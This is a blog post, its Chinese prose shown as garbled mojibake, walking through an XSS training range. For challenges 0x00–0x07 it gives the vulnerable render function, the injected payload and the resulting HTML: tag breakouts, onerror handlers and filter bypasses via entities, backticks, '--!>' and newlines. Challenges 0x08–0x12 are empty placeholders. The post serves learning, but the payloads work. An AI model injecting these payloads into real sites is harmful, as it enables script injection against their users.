---
layout: post
title: XSS å°æ¸¸æˆç»ƒä¹ 
categories: [XSS, Webå®‰å…¨, æ¸—é€æµ‹è¯•]
---

## å‰è¨€

ä»Šå¤©åœ¨é—²é€›æ—¶å‘ç°ä¸€ä¸ªé’ˆå¯¹ XSS å…¥é—¨çš„å°é¶åœºï¼Œæƒ³æƒ³è‡ªå·±è¿™ä¸€å¹´æ¥ä¸€ç›´éƒ½åœ¨å­¦ä¹ å¼€å‘æ–¹é¢çš„çŸ¥è¯†ï¼Œå¯¹å®‰å…¨çš„ä¸œè¥¿æœ‰äº›ç”Ÿç–äº†ï¼Œæ­£å¥½å¯ä»¥å½“ä½œå¤ä¹ äº†

é¶åœºä¸€å…±æœ‰ 18 ä¸ªé¢˜ç›®ï¼Œæ¯é“é¢˜åˆ†ä¸º Server Code(æœåŠ¡ç«¯ä»£ç )ã€Input Code(å¯è¾“å…¥ç‚¹)ã€Html(æ˜¾ç¤ºç‚¹)ã€‚åˆ†æ Server Code åœ¨ Input Code å¤„è¾“å…¥æ„é€ çš„ Payloadï¼Œæœ€åç»“æœä¼šæ˜¾ç¤ºåœ¨ Html å¤„ã€‚éƒ½æ˜¯ XSS æœ€åŸºç¡€çš„çŸ¥è¯†ç‚¹ï¼Œéå¸¸é€‚åˆå…¥é—¨å­¦ä¹ ï¼Œå› æ­¤è®°å½•ä¸€ä¸‹

é¶åœºåœ°å€ï¼šhttps://xss.haozi.me

**Tipsï¼šæ­¤é¶åœºåªé€‚åˆäº†è§£ XSSï¼Œå¹¶ä¸å…·å¤‡ä»»ä½•å®æˆ˜æ„ä¹‰**

## 0x00

æœ€åŸºç¡€çš„å¼¹çª—ä»£ç 

Server Code
```js
function render (input) {
  return '<div>' + input + '</div>'
}
```

Input Code
```js
<script>alert(1)</script>
```

HTML
```html
<div><script>alert(1)</script></div>
```

## 0x01

æ ‡ç­¾é—­åˆ

Server Code
```js
function render (input) {
  return '<textarea>' + input + '</textarea>'
}
```

Input Code
```html
</textarea><script>alert(1)</script>
```

HTML
```html
<textarea></textarea><script>alert(1)</script>
  </textarea>
```


## 0x02

å¼•å·å’Œæ ‡ç­¾é—­åˆ

Server Code
```js
function render (input) {
  return '<input type="name" value="' + input + '">'
}
```

Input Code
```js
"><script>alert(1)</script>
```

HTML
```html
<input type="name" value=""><script>alert(1)</script>">
```

## 0x03

æ­£åˆ™æ›¿æ¢äº†å°æ‹¬å·ï¼Œç”¨å®ä½“å­—ç¬¦ç»•è¿‡æˆ–ä½¿ç”¨åå¼•å·ç»•è¿‡ã€‚

å®ä½“å­—ç¬¦ç»•è¿‡æ˜¯ HTML çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šHTML ä¼šå°†å®ä½“å­—ç¬¦è§£ææˆå¯¹åº”çš„ç¬¦å·ï¼Œå› æ­¤åœ¨ HTML çš„æ ‡ç­¾ä¸­å¯ä»¥é€šè¿‡å®ä½“å­—ç¬¦æ¥ç»•è¿‡ JS ä¸­çš„è¿‡æ»¤ï¼Œä½†æ˜¯ JS ä»£ç ä¸­æ— æ³•è§£æ HTML ç¼–ç ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨

åå¼•å·ç»•è¿‡æ˜¯ JS çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šJS ä¼šå°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸ºå¯æ‰§è¡Œä»£ç ï¼ˆå¾ˆå¤šè„šæœ¬è¯­è¨€éƒ½æœ‰è¿™ä¸ªç‰¹æ€§ï¼‰

`<script>`æ ‡ç­¾

Server Code
```js
function render (input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

Input Code
```html
<!-- HTMLæ ‡ç­¾ä½¿ç”¨å®ä½“å­—ç¬¦ç»•è¿‡ -->
<img src="" onerror=alert&#40;&#49;&#41;>
<!-- ä½¿ç”¨åå¼•å·ç»•è¿‡ -->
<img src="" onerror=alert`1`>
```

HTML
```html
<img src="" onerror=alert&#40;&#49;&#41;>
<img src="" onerror=alert`1`>
```

## 0x04

æ­£åˆ™æ›¿æ¢äº†å°æ‹¬å·å’Œåå¼•å·ï¼Œä½¿ç”¨ HTML ç¼–ç ç»•è¿‡

Server Code
```js
function render (input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

Input Code
```html
<img src="" onerror=alert&#40;&#49;&#41;>
```

HTML
```html
<img src="" onerror=alert&#40;&#49;&#41;>
```

## 0x05

ä½¿ç”¨`--!>`é—­åˆæ‰æ³¨é‡Šæ ‡ç­¾ï¼Œæ¢è¡Œåªæ˜¯ä¸ªäººä¹ æƒ¯

Server Code
```js
function render (input) {
  input = input.replace(/-->/g, 'ğŸ˜‚')
  return '<!-- ' + input + ' -->'
}
```

Input Code
```html
--!>
<img src="" onerror=alert&#40;&#49;&#41;>

```

HTML
```html
<!-- --!>
  <img src="" onerror=alert&#40;&#49;&#41;>
 -->
```

## 0x06

åˆ©ç”¨æ­£åˆ™ä¸åŒ¹é…æ¢è¡Œç¬¦çš„ç‰¹æ€§ï¼Œä½¿ç”¨æ¢è¡Œç»•è¿‡

Server Code
```js
function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}
```

Input Code
```html
onclick
=alert(1)
```

HTML
```html
<input value=1 onclick
=alert(1) type="text">
```

## 0x07

åˆ©ç”¨ HTML æ ‡ç­¾ä¸é—­åˆä¹Ÿèƒ½è§£æçš„å®¹é”™æœºåˆ¶ï¼Œé—­åˆæ‰å‰é¢çš„æ ‡ç­¾

Server Code
```js
function render (input) {
  const stripTagsRe = /<\/?[^>]+>/gi

  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}
```

Input Code
```js
< /article
<img src="" onerror=alert(1)
<!--
```

HTML
```html
<article>< /article
<img src="" onerror=alert(1)
<!--</article>
```

## 0x08



Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x09

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x0A

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x0B

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x0C

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x0D

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x0E

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x0F

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x10

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x11

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x12

Server Code
```js

```

Input Code
```js

```

HTML
```html

```
